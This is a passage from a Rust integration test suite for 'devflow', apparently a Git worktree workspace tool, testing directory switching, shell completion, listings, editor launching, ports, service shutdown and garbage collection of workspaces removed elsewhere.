    failed(&env.run(&["switch", "-c"]));
}

#[test]
fn switch_dash_returns_to_the_directory_the_shell_left() {
    let env = Env::new();
    env.init();
    commit_files(&env, &[("apps/web/index.js", "x\n")]);
    let feature = workspace(&env, "feature/a");

    // Without the wrapper there is nothing that remembers.
    let out = env.run(&["--non-interactive", "switch", "-"]);
    failed(&out);
    assert!(
        stderr(&out).contains("shell integration"),
        "{}",
        describe(&out)
    );
    assert!(stderr(&out).contains("shell-init"), "{}", describe(&out));
    let doc = json(&env.run(&["--json", "switch", "-"]));
    assert_eq!(doc["remedies"][0]["kind"], "shell_integration", "{doc}");

    // With it, but before the first change of directory.
    let (out, target) = switch_through_wrapper(&env, &env.repo, &["-"], None);
    failed(&out);
    assert!(stderr(&out).contains("no previous"), "{}", describe(&out));
    assert!(target.is_empty());

    // The shell was in feature/a/apps/web and left it: back there, exactly.
    let there = feature.join("apps/web");
    let (out, target) = switch_through_wrapper(&env, &env.repo, &["-"], Some(&there));
    ok(&out);
    assert!(same_path(&target, &there), "{target}\n{}", describe(&out));

    // A directory that is gone, or is no workspace's, is said.
    let (out, _) = switch_through_wrapper(&env, &env.repo, &["-"], Some(&feature.join("gone")));
    failed(&out);
    assert!(
        stderr(&out).contains("no longer exists"),
        "{}",
        describe(&out)
    );
    let outside = env.root.join("home");
    let (out, _) = switch_through_wrapper(&env, &env.repo, &["-"], Some(&outside));
    failed(&out);
    assert!(
        stderr(&out).contains("not in a devflow project"),
        "{}",
        describe(&out)
    );
}

#[test]
fn switch_keeps_the_subdirectory_when_the_target_has_it() {
    let env = Env::new();
    env.init();
    commit_files(&env, &[("apps/web/index.js", "x\n")]);
    let feature = workspace(&env, "feature/a");
    let main = default_name(&env);
    std::fs::create_dir_all(env.repo.join("only-here")).unwrap();

    let (out, target) =
        switch_through_wrapper(&env, &env.repo.join("apps/web"), &["feature/a"], None);
    ok(&out);
    assert!(
        same_path(&target, &feature.join("apps/web")),
        "{target}\n{}",
        describe(&out)
    );
    // The target has no such directory: its root.
    let (out, target) =
        switch_through_wrapper(&env, &env.repo.join("only-here"), &["feature/a"], None);
    ok(&out);
    assert!(same_path(&target, &feature), "{target}\n{}", describe(&out));
    // Back from the feature's subdirectory to the main checkout's.
    let (out, target) =
        switch_through_wrapper(&env, &feature.join("apps/web"), &[main.as_str()], None);
    ok(&out);
    assert!(
        same_path(&target, &env.repo.join("apps/web")),
        "{target}\n{}",
        describe(&out)
    );
    // Without the wrapper the path is printed.
    let out = env.run_in(
        &env.repo.join("apps/web"),
        &["--non-interactive", "switch", "feature/a"],
    );
    ok(&out);
    assert!(
        same_path(&stdout(&out), &feature.join("apps/web")),
        "{}",
        describe(&out)
    );
}

/// The words the shell would hand devflow to complete (`words`, the last being
/// the one being typed).
fn complete(env: &Env, dir: &Path, words: &[&str]) -> Vec<String> {
    let mut command = env.command(dir);
    command
        .env("COMPLETE", "bash")
        .env("_CLAP_IFS", "\n")
        .env("_CLAP_COMPLETE_INDEX", (words.len()).to_string())
        .arg("--")
        .arg("devflow")
        .args(words);
    let out = command.output().unwrap();
    ok(&out);
    stdout(&out).lines().map(str::to_string).collect()
}

#[test]
fn workspace_names_complete_from_local_state_for_the_commands_that_take_one() {
    let env = Env::new();
    env.init();
    workspace(&env, "feature/a");
    workspace(&env, "fix-b");
    for command in ["switch", "path", "remove", "up", "down", "ps", "open"] {
        assert_eq!(
            complete(&env, &env.repo, &[command, "f"]),
            ["feature/a", "fix-b"],
            "{command}"
        );
    }
    let all = complete(&env, &env.repo, &["path", ""]);
    assert!(
        all.contains(&default_name(&env)) && all.contains(&"fix-b".to_string()),
        "{all:?}"
    );
    assert_eq!(complete(&env, &env.repo, &["path", "fe"]), ["feature/a"]);
    // `--from` takes one too.
    assert_eq!(
        complete(&env, &env.repo, &["switch", "-c", "x", "--from", "fe"]),
        ["feature/a"]
    );
    // `-C` is honoured: from outside the project, with `-C` naming it.
    let elsewhere = env.root.join("home");
    let repo = env.repo.to_str().unwrap();
    assert_eq!(
        complete(&env, &elsewhere, &["-C", repo, "path", "fe"]),
        ["feature/a"]
    );
    assert_eq!(
        complete(&env, &elsewhere, &["path", "-C", repo, "fe"]),
        ["feature/a"]
    );
    // A directory that is no project completes nothing (and does not fail).
    let outside = complete(&env, &env.root.join("home"), &["path", ""]);
    assert!(
        outside.iter().all(|word| word.starts_with('-')),
        "only options, no workspace: {outside:?}"
    );
    // The registration script is the hook into the shell.
    for shell in ["bash", "zsh", "fish"] {
        let out = env.run(&["completions", shell]);
        ok(&out);
        assert!(
            stdout(&out).contains("COMPLETE"),
            "{shell}: {}",
            stdout(&out)
        );
    }
}

#[test]
fn the_wrapper_in_a_real_shell_changes_directory_and_goes_back() {
    let bash = Path::new("/bin/bash");
    if !bash.is_file() {
        return;
    }
    let env = Env::new();
    env.init();
    commit_files(&env, &[("apps/web/index.js", "x\n")]);
    let feature = workspace(&env, "feature/a");
    let bin = Path::new(env!("CARGO_BIN_EXE_devflow")).parent().unwrap();
    let script = format!(
        "eval \"$(devflow shell-init bash)\"\n\
         cd {repo}/apps/web\n\
         devflow --non-interactive switch feature/a >/dev/null 2>&1\n\
         echo \"1 $PWD\"\n\
         devflow --non-interactive switch - >/dev/null 2>&1\n\
         echo \"2 $PWD\"\n\
         devflow --non-interactive switch - >/dev/null 2>&1\n\
         echo \"3 $PWD\"\n\
         COMPLETE=bash _CLAP_COMPLETE_INDEX=2 devflow -- devflow path fe\n",
        repo = env.repo.display()
    );
    let out = env
        .command(&env.repo)
        .env(
            "PATH",
            format!("{}:{}", bin.display(), std::env::var("PATH").unwrap()),
        )
        .arg("-c")
        .arg(&script)
        .output();
    // (`Command::new` was the devflow binary: run bash through the same environment.)
    drop(out);
    let mut command = Command::new(bash);
    command
        .current_dir(&env.repo)
        .env("HOME", env.root.join("home"))
        .env("DEVFLOW_CONFIG_DIR", env.root.join("config"))
        .env("DEVFLOW_DATA_DIR", env.root.join("data"))
        .env("NO_COLOR", "1")
        .env(
            "PATH",
            format!("{}:{}", bin.display(), std::env::var("PATH").unwrap()),
        )
        .env_remove("DEVFLOW_PREVIOUS")
        .stdin(Stdio::null())
        .arg("-c")
        .arg(&script);
    let out = command.output().unwrap();
    ok(&out);
    let lines: Vec<String> = stdout(&out).lines().map(str::to_string).collect();
    let at = |n: usize| lines[n].split_once(' ').unwrap().1.to_string();
    assert!(
        same_path(&at(0), &feature.join("apps/web")),
        "{}",
        describe(&out)
    );
    assert!(
        same_path(&at(1), &env.repo.join("apps/web")),
        "{}",
        describe(&out)
    );
    assert!(
        same_path(&at(2), &feature.join("apps/web")),
        "{}",
        describe(&out)
    );
    // The completion request went straight through the wrapper.
    assert_eq!(lines[3], "feature/a", "{}", describe(&out));
}

#[test]
fn list_wide_adds_what_the_default_listing_leaves_out() {
    let env = Env::new();
    env.init();
    let feature = workspace(&env, "feature/a");
    std::fs::write(feature.join("scratch.txt"), "x\n").unwrap();

    // The default listing is unchanged: no wide object, no extra column.
    let doc = json(&env.run(&["--json", "list"]));
    assert!(doc["workspaces"][0].get("wide").is_none(), "{doc}");
    let human = stdout(&env.run(&["list"]));
    assert!(!human.contains("CHANGES"), "{human}");

    let doc = json(&env.run(&["--json", "list", "--wide"]));
    let item = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| w["workspace"]["name"] == "feature/a")
        .unwrap();
    assert_eq!(item["wide"]["dirty"], true, "{item}");
    let port = item["wide"]["app_port"].as_u64().expect("a port");
    assert!((40000..=49999).contains(&port));
    assert_eq!(item["wide"]["ahead_behind"]["ahead"], 0, "{item}");
    assert!(item["wide"]["last_active_at"].is_string(), "{item}");
    assert_eq!(item["wide"]["services"], json!([]));
    assert_eq!(item["wide"]["daemons"], json!([]));
    let main = &doc["workspaces"][0];
    assert!(main["wide"]["dirty"].is_boolean(), "{main}");
    assert!(
        main["wide"].get("ahead_behind").is_none(),
        "the default workspace has no base: {main}"
    );

    let human = stdout(&env.run(&["list", "--wide"]));
    let header = human.lines().next().unwrap();
    for column in [
        "PORT", "CHANGES", "UPSTREAM", "MERGED", "ACTIVE", "SERVICES", "DAEMONS",
    ] {
        assert!(header.contains(column), "{human}");
    }
    let line = human.lines().find(|l| l.contains("feature/a")).unwrap();
    assert!(
        line.contains("dirty") && line.contains(&port.to_string()),
        "{human}"
    );
    failed(&env.run(&["list", "--wide", "--all"]));
}

#[test]
fn open_runs_the_configured_editor_or_terminal_in_the_workspace() {
    let env = Env::new();
    env.init();
    let feature = workspace(&env, "feature/a");
    let editor = env.fake_program(
        "fake-editor",
        "echo \"PWD=$(pwd)\" >> \"$FAKE_LOG\"\nfor a in \"$@\"; do echo \"ARG=$a\" >> \"$FAKE_LOG\"; done",
    );
    let terminal = env.fake_program(
        "fake-terminal",
        "for a in \"$@\"; do echo \"ARG=$a\" >> \"$FAKE_LOG\"; done",
    );
    std::fs::write(
        env.root.join("config/settings.toml"),
        format!(
            "editor_command = \"{}/fake-editor --flag\"\nterminal_command = \"{}/fake-terminal --cwd={{path}}\"\n",
            editor.dir.display(),
            terminal.dir.display()
        ),
    )
    .unwrap();
    let run = |args: &[&str], log: &FakeProgram| {
        let out = env
            .command(&env.repo)
            .env("FAKE_LOG", &log.log)
            .args(args)
            .output()
            .unwrap();
        ok(&out);
        out
    };
    // JSON starts it and reports what it started.
    let out = run(&["--json", "open", "feature/a"], &editor);
    let doc = json(&out);
    assert_eq!(doc["tool"], "editor", "{doc}");
    // The envelope's `command` is the document's name; what was started is `argv`.
    assert_eq!(doc["command"], "open", "{doc}");
    assert_eq!(doc["argv"][1], "--flag", "{doc}");
    // (The program was started detached: wait until it has written all it will.)
    for _ in 0..100 {
        let written = std::fs::read_to_string(&editor.log).unwrap_or_default();
        if written.lines().count() >= 3 {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    assert_eq!(editor.args(), ["--flag", feature.to_str().unwrap()]);
    assert!(
        editor
            .lines()
            .iter()
            .any(|l| l.starts_with("PWD=") && same_path(&l[4..], &feature)),
        "{:?}",
        editor.lines()
    );
    // The terminal, with `{path}` replaced.
    run(&["open", "--terminal", "feature/a"], &terminal);
    assert_eq!(terminal.args(), [format!("--cwd={}", feature.display())]);
    // Without a name: the workspace the caller is in.
    let out = env
        .command(&feature)
        .env("FAKE_LOG", env.root.join("again.log"))
        .arg("open")
        .output()
        .unwrap();
    ok(&out);
    assert!(env.root.join("again.log").exists());
    failed(&env.run(&["open", "--editor", "--terminal"]));
    failed(&env.run(&["open", "nope"]));

    // A program that is not there: the settings file is the way on.
    std::fs::write(
        env.root.join("config/settings.toml"),
        "editor_command = \"/definitely/not/installed\"\n",
    )
    .unwrap();
    let out = env.run(&["open", "feature/a"]);
    failed(&out);
    assert!(stderr(&out).contains("cannot run"), "{}", describe(&out));
    assert!(stderr(&out).contains("settings.toml"), "{}", describe(&out));
}

#[test]
fn every_workspace_gets_a_port_that_ps_and_exec_show() {
    let env = Env::new();
    env.init();
    let a = workspace(&env, "feature/a");
    let b = workspace(&env, "feature/b");
    let port_of = |name: &str| -> u64 {
        let doc = json(&env.run(&["--json", "ps", name]));
        doc["workspaces"][0]["app_port"]
            .as_u64()
            .unwrap_or_else(|| panic!("{doc}"))
    };
    let (pa, pb) = (port_of("feature/a"), port_of("feature/b"));
    assert_ne!(pa, pb);
    assert!(stdout(&env.run(&["ps", "feature/a"])).contains(&format!("app port {pa}")));
    // The same port is in the file and in a command run through `exec`.
    let out = env
        .command(&a)
        .args(["exec", "--", "sh", "-c", "echo $DEVFLOW_PORT"])
        .output()
        .unwrap();
    ok(&out);
    assert_eq!(stdout(&out).trim(), pa.to_string());
    let env_file = std::fs::read_to_string(b.join(".devflow/env")).unwrap();
    assert!(
        env_file.contains(&format!("DEVFLOW_PORT='{pb}'")),
        "{env_file}"
    );
    // A caller's DEVFLOW_PORT is the caller's workspace's, not this one's.
    let out = env
        .command(&a)
        .env("DEVFLOW_PORT", "1")
        .args(["exec", "--", "sh", "-c", "echo $DEVFLOW_PORT"])
        .output()
        .unwrap();
    ok(&out);
    assert_eq!(stdout(&out).trim(), pa.to_string());
}

#[test]
fn up_and_down_take_services_and_all_without_any() {
    let env = Env::new();
    env.init();
    workspace(&env, "feature/a");
    // No container services and no daemons: nothing to do, and not an error
    // once the person asked for the services or for every workspace.
    let out = env.run(&["--json", "down", "--services", "feature/a"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["ok"], true, "{doc}");
    assert_eq!(
        doc["workspaces"][0]["services"]["services"],
        json!([]),
        "{doc}"
    );
    let out = env.run(&["--json", "down", "--all", "--services"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["workspaces"].as_array().unwrap().len(), 2, "{doc}");
    let out = env.run(&["--json", "up", "--services", "feature/a"]);
    ok(&out);
    assert_eq!(json(&out)["workspaces"][0]["workspace"], "feature/a");
    // Plain `down` keeps saying that there is nothing configured.
    failed(&env.run(&["down", "feature/a"]));
    failed(&env.run(&["down", "--all", "feature/a"]));
}

#[test]
fn bulk_shutdown_and_the_wide_listing_find_a_daemon_whose_definition_was_removed() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    // The daemon runs, then its definition is removed from the worktree.
    fake.set(
        "list.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
    );
    std::fs::write(
        path.join("pitchfork.toml"),
        "# nothing is declared any more\n",
    )
    .unwrap();

    // The wide listing still shows what runs under the workspace's namespace.
    let doc = json(ok(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "list", "--wide"],
    )));
    let item = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| w["workspace"]["name"] == "feature/p")
        .unwrap();
    assert_eq!(item["wide"]["daemons"][0]["name"], "web", "{item}");
    assert_eq!(item["wide"]["daemons"][0]["state"], "running", "{item}");

    // `down --all --force` stops it by its full id instead of skipping a
    // workspace whose configuration declares nothing.
    let out = env.run_fake(&fake, &env.repo, &["--json", "down", "--all", "--force"]);
    let doc = json(&out);
    assert!(
        fake.mutations().contains(&format!("stop {namespace}/web")),
        "{:?}\n{doc}",
        fake.mutations()
    );
}

#[test]
fn a_receipt_that_cannot_be_read_is_not_a_workspace_without_services() {
    let env = Env::new();
    env.init();
    let feature = workspace(&env, "feature/a");
    let git_dir = git2::Repository::open(&feature)
        .unwrap()
        .path()
        .to_path_buf();
    std::fs::write(git_dir.join("devflow/receipt.json"), "{ not json").unwrap();

    for args in [
        ["--json", "down", "--services", "feature/a"],
        ["--json", "up", "--services", "feature/a"],
    ] {
        let out = env.run(&args);
        failed(&out);
        let doc = json(&out);
        assert_eq!(doc["ok"], false, "{doc}");
        let services = &doc["workspaces"][0]["services"];
        assert!(
            services["error"]
                .as_str()
                .is_some_and(|e| e.contains("cannot be read")),
            "{doc}"
        );
        assert_eq!(services["services"], json!([]), "{doc}");
    }
    let out = env.run(&["down", "--services", "feature/a"]);
    failed(&out);
    assert!(
        stdout(&out).contains("container services"),
        "{}",
        describe(&out)
    );
}

// --- gc: workspaces Git or an agent host removed ---------------------------------

/// What an agent host does when it is done with a worktree: delete the
/// directory and Git's registration of it, and nothing else.
fn removed_by_a_host(env: &Env, path: &Path) {
    let path = path.canonicalize().unwrap();
    let git = git2::Repository::open(&env.repo).unwrap();
    let name = git
        .worktrees()
        .unwrap()
        .iter()
        .flatten()
        .flatten()
        .map(str::to_string)
        .find(|name| {
            git.find_worktree(name)
                .map(|w| w.path().canonicalize().ok().as_deref() == Some(path.as_path()))
                .unwrap_or(false)
        })
        .expect("a registered worktree at that path");
    let registration = git.find_worktree(&name).unwrap();
    std::fs::remove_dir_all(&path).unwrap();
    registration
        .prune(Some(
            git2::WorktreePruneOptions::new().valid(true).locked(true),
        ))
        .unwrap();
}

#[test]
fn gc_finds_what_a_host_left_behind_and_removes_only_what_is_named() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    fake.set(
        "after_start.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
    );
    ok(&env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]));
    assert_eq!(fake.mutations(), [format!("start -q {namespace}/web")]);
    removed_by_a_host(&env, &path);

    // Nothing but the main checkout is registered; `list` says what is left,
    // from files alone, with the way on.
    let doc = json(ok(&env.run(&["--json", "list"])));
    assert_eq!(doc["workspaces"].as_array().unwrap().len(), 1, "{doc}");
    assert_eq!(
        doc["cleanup"]["removed_elsewhere"],
        json!(["feature/p"]),
        "{doc}"
    );
    assert_eq!(doc["cleanup"]["remedies"][0]["kind"], "clean_up", "{doc}");
    assert_eq!(
        doc["cleanup"]["remedies"][0]["command"], "devflow gc",
        "{doc}"
    );
    let out = env.run(&["list"]);
    ok(&out);
    assert!(
        stderr(&out).contains("1 workspace removed outside devflow still own data or processes")
            && stderr(&out).contains("devflow gc"),
        "{}",
        describe(&out)
    );
    assert!(
        !stdout(&out).contains("removed outside"),
        "the table stays a table"
    );
    // `doctor` reports it, with the same remedy.
    let doc = json(&env.run(&["--json", "doctor"]));
    let check = doc["checks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["name"] == "workspaces-gone")
        .unwrap_or_else(|| panic!("{doc}"));
    assert_eq!(check["remedies"][0]["kind"], "clean_up", "{doc}");

    // The inventory changes nothing.
    let doc = json(ok(&env.run_fake(&fake, &env.repo, &["--json", "gc"])));
    assert_eq!(doc["command"], "gc", "{doc}");
    let entries = doc["inventory"]["entries"].as_array().unwrap();
    let entry = entries
        .iter()
        .find(|e| e["workspace"] == "feature/p")
        .unwrap_or_else(|| panic!("{doc}"));
    assert_eq!(entry["class"], "removed_elsewhere", "{doc}");
    assert_eq!(entry["removable"], true, "{doc}");
    assert_eq!(
        entry["daemons"],
        json!([format!("{namespace}/web")]),
        "{doc}"
    );
    assert_eq!(entry["merge"]["state"], "merged", "{doc}");
    let instance = entry["instance"].as_str().unwrap().to_string();
    let short = &instance[..8];
    let text = stdout(ok(&env.run_fake(&fake, &env.repo, &["gc"])));
    for needle in [
        short,
        "feature/p",
        "removed elsewhere",
        "1 daemon",
        "merged into",
    ] {
        assert!(text.contains(needle), "{needle:?} missing:\n{text}");
    }
    assert_eq!(
        fake.mutations().len(),
        1,
        "only the start: {:?}",
        fake.mutations()
    );

    // Naming it is not enough without --yes in a script: nothing is removed.
    let doc = json(ok(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "gc", "--remove", short],
    )));
    assert_eq!(doc["confirmed"], false, "{doc}");
    assert_eq!(doc["removed"], json!([]), "{doc}");
    assert_eq!(fake.mutations().len(), 1);
    // An id that names nothing is an error that lists nothing it was not given.
    failed(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "gc", "--remove", "deadbeef", "--yes"],
    ));

    // A daemon that runs is never stopped by a clean-up (pitchfork would run its
    // lifecycle hooks from a configuration nobody approved): the removal is
    // refused, forceable, and nothing was touched.
    fake.set(
        "list.json",
        &serde_json::to_string(&json!([
            daemon(&namespace, "running", Some(4242)),
            daemon("df-someone-else", "running", Some(1)),
        ]))
        .unwrap(),
    );
    let out = env.run_fake(
        &fake,
        &env.repo,
        &["--json", "gc", "--remove", short, "--yes"],
    );
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["removed"], json!([]), "{doc}");
    assert_eq!(doc["skipped"][0]["forceable"], true, "{doc}");
    assert!(
        doc["skipped"][0]["reason"]
            .as_str()
            .unwrap()
            .contains("lifecycle hooks"),
        "{doc}"
    );
    assert!(
        doc["error"].as_str().unwrap().contains("feature/p"),
        "{doc}"
    );
    assert_eq!(
        fake.mutations().len(),
        1,
        "never stopped: {:?}",
        fake.mutations()
    );

    // Once the person stopped it, the listing shows nothing of the namespace
    // running and the record goes.
    fake.set(
        "list.json",
        &serde_json::to_string(&json!([
            daemon(&namespace, "stopped", None),
            daemon("df-someone-else", "running", Some(1)),
        ]))
        .unwrap(),
    );
    let doc = json(ok(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "gc", "--remove", short, "--yes"],
    )));
    assert_eq!(doc["confirmed"], true, "{doc}");
    assert_eq!(doc["removed"][0]["workspace"], "feature/p", "{doc}");
    assert_eq!(doc["skipped"], json!([]), "{doc}");
    assert_eq!(
        fake.mutations(),
        [format!("start -q {namespace}/web")],
        "devflow stopped nothing"
    );
    let records = env.repo.join(".git/devflow/workspaces");
    assert!(
        std::fs::read_dir(&records).map(|d| d.count()).unwrap_or(0) == 0,
        "the record is gone"
    );
    // Nothing left to say.
    let doc = json(ok(&env.run(&["--json", "list"])));
    assert!(doc.get("cleanup").is_none(), "{doc}");
    let text = stdout(ok(&env.run(&["gc"])));
    assert!(
        text.contains("No workspace was removed outside devflow"),
        "{text}"
    );
}

#[test]
fn gc_never_removes_an_active_workspace_even_when_it_is_named() {
    let env = Env::new();
    env.init();
    let out = env.run(&[
        "--json",
        "--non-interactive",
        "switch",
        "-c",
        "feature/live",
    ]);
    ok(&out);
    let path = PathBuf::from(json(&out)["path"].as_str().unwrap());
    let doc = json(ok(&env.run(&["--json", "gc", "--all"])));
    let entry = doc["inventory"]["entries"]
        .as_array()
        .unwrap()
        .iter()
        .find(|e| e["workspace"] == "feature/live")
        .unwrap_or_else(|| panic!("{doc}"))
        .clone();
    assert_eq!(entry["class"], "active", "{doc}");
    assert_eq!(entry["removable"], false, "{doc}");
    let short = entry["instance"].as_str().unwrap()[..8].to_string();
    let out = env.run(&["--json", "gc", "--remove", &short, "--yes"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["removed"], json!([]), "{doc}");
    assert!(
        doc["error"].as_str().unwrap().contains("active workspace"),
        "{doc}"
    );
    assert!(path.is_dir(), "the checkout is untouched");
    // --snapshot, --force and --yes need something to remove.
    failed(&env.run(&["--json", "gc", "--yes"]));
}

#[test]
fn removing_a_name_that_only_a_record_remembers_points_to_gc() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    fake.set(
        "after_start.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
    );
    ok(&env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]));
    removed_by_a_host(&env, &path);
    let out = env.run(&["--json", "remove", "feature/p"]);
    failed(&out);
    let doc = json(&out);
    assert!(
        doc["error"]
            .as_str()
            .unwrap()
            .contains("removed outside devflow"),
        "{doc}"
    );
    assert_eq!(doc["remedies"][0]["kind"], "clean_up", "{doc}");
    assert_eq!(doc["remedies"][0]["command"], "devflow gc", "{doc}");
}

#[test]
fn bulk_shutdown_does_not_read_an_unreadable_record_as_no_daemons() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (path, namespace) = env.workspace_with_daemon(&fake);
    fake.set(
        "list.json",
        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
    );
    // Every pitchfork file is gone and the record cannot be read: nothing says
    // whether devflow started anything here, and nothing says it did not.
    std::fs::remove_file(path.join("pitchfork.toml")).unwrap();
    std::fs::remove_file(path.join("pitchfork.local.toml")).unwrap();
    let git_dir = git2::Repository::open(&path).unwrap().path().to_path_buf();
    std::fs::write(git_dir.join("devflow/receipt.json"), "{ not json").unwrap();

    let out = env.run_fake(&fake, &env.repo, &["--json", "down", "--all"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["ok"], false, "{doc}");
    let item = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| {
            w["workspace"] == "feature/p"
                || w["path"].as_str().is_some_and(|p| p.ends_with("feature-p"))
        })
        .unwrap();
    assert!(
        item.get("daemons_error").is_some() || item["daemons"]["state_error"].is_string(),
        "reached the guarded stop path, which did not call it a success: {item}"
    );
}

#[test]
fn the_wide_listing_says_unknown_when_pitchfork_could_not_be_asked() {
    let env = Env::new();
    let fake = env.fake_pitchfork();
    let (_path, _namespace) = env.workspace_with_daemon(&fake);
    fake.set("list_fail", "");
    let doc = json(ok(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "list", "--wide"],
    )));
    let item = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| w["workspace"]["name"] == "feature/p")
        .unwrap();
    assert!(
        item["wide"]["daemons_unobserved"].is_string(),
        "an unobserved listing says so: {item}"
    );
    assert_eq!(item["wide"]["daemons"][0]["state"], "unknown", "{item}");
    let human = stdout(ok(&env.run_fake(&fake, &env.repo, &["list", "--wide"])));
    let line = human.lines().find(|l| l.contains("feature/p")).unwrap();
    assert!(
        line.contains('?') && !line.contains("not started"),
        "{human}"
    );
    assert!(human.contains("what runs was not observed"), "{human}");
    // Observed again: back to the facts.
    std::fs::remove_file(fake.dir.join("list_fail")).unwrap();
    let doc = json(ok(&env.run_fake(
        &fake,
        &env.repo,
        &["--json", "list", "--wide"],
    )));
    let item = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| w["workspace"]["name"] == "feature/p")
        .unwrap();
    assert!(item["wide"].get("daemons_unobserved").is_none(), "{item}");
    assert_eq!(item["wide"]["daemons"][0]["state"], "not started", "{item}");
}
